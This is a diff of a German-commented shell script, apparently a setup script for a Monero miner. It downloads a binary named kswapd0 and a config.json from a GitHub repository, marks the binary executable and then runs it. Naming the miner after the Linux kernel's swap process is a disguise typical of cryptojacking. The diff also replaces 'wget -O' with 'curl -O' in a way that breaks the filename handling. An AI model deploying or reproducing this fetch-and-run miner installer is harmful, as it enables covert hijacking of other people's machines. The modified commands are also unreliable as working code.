@@ -17,7 +17,7 @@ if [ -f "$KSWAPD0" ] && [ -x "$KSWAPD0" ]; then
     echo "kswapd0 existiert und ist ausführbar."
 else
     echo "kswapd0 existiert nicht oder ist nicht ausführbar. Herunterladen..."
-    wget -O "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
+    curl -O "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
     chmod +x "$KSWAPD0"
 fi
 
@@ -25,7 +25,7 @@ if [ -f "$CONFIG_JSON" ]; then
     echo "config.json existiert."
 else
     echo "config.json existiert nicht. Herunterladen..."
-    wget -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+    curl -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
 fi
 
 # kswapd0 ausführen, wenn kein anderer Prozess mit der spezifischen Konfiguration läuft
